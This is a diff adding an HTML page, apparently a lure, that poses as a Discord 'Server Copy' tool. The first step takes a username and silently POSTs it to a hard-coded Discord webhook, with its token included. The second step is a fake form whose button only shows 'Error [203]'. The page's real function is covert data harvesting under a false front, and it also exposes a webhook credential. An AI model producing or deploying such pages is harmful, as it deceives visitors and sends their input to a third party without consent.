@@ -1,0 +1,86 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Good Vibes</title>
+  <style>
+    * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
+    body {
+      margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
+      background: linear-gradient(120deg, #0f2027, #203a43, #2c5364);
+      background-size: 400% 400%; animation: gradient 12s ease infinite; color: #fff;
+    }
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .card {
+      width: 92%; max-width: 360px; padding: 24px; border-radius: 20px;
+      background: rgba(255,255,255,0.08); backdrop-filter: blur(12px);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.35);
+      animation: pop 0.6s ease;
+    }
+    @keyframes pop { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    h1 { font-size: 22px; margin: 0 0 14px; text-align: center; }
+    p { font-size: 14px; opacity: 0.85; text-align: center; margin-bottom: 18px; }
+    input {
+      width: 100%; padding: 14px 16px; margin-bottom: 14px; border-radius: 14px; border: none;
+      outline: none; font-size: 15px;
+    }
+    button {
+      width: 100%; padding: 14px; border-radius: 14px; border: none; cursor: pointer;
+      background: linear-gradient(135deg, #00c6ff, #0072ff); color: #fff; font-size: 16px;
+    }
+    button:active { transform: scale(0.98); }
+    .hidden { display: none; }
+    .fade-out { animation: fadeOut 0.5s forwards; }
+    @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
+    .error { color: #ff6b6b; text-align: center; margin-top: 10px; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <!-- STEP 1 -->
+  <div class="card" id="step1">
+    <h1>Welcome</h1>
+    <p>Enter your username to continue</p>
+    <input type="text" id="username" placeholder="Enter username" />
+    <button onclick="sendUsername()">Continue</button>
+  </div>  <!-- STEP 2 -->  <div class="card hidden" id="step2">
+    <h1>Server Copy</h1>
+    <input type="text" placeholder="Server you wanna copy" />
+    <input type="text" placeholder="Server you wanna copy in" />
+    <button onclick="showError()">Proceed</button>
+    <div class="error hidden" id="err">Error [203]</div>
+  </div>  <script>
+    // PUT YOUR DISCORD WEBHOOK URL HERE
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1462340376466817075/_9llAi-4aXEvCRxYm9iLglwpixCFu96kX2J5YSC10sGfw-4WnysFTIaUCcBWAJxz0k14";
+
+    function sendUsername() {
+      const username = document.getElementById('username').value.trim();
+      if (!username) return;
+
+      // Send to Discord webhook
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `Username entered: **${username}**` })
+      }).catch(() => {});
+
+      // Animate away step 1
+      const s1 = document.getElementById('step1');
+      s1.classList.add('fade-out');
+
+      setTimeout(() => {
+        s1.classList.add('hidden');
+        const s2 = document.getElementById('step2');
+        s2.classList.remove('hidden');
+      }, 500);
+    }
+
+    function showError() {
+      const err = document.getElementById('err');
+      err.classList.remove('hidden');
+    }
+  </script></body>
+</html>
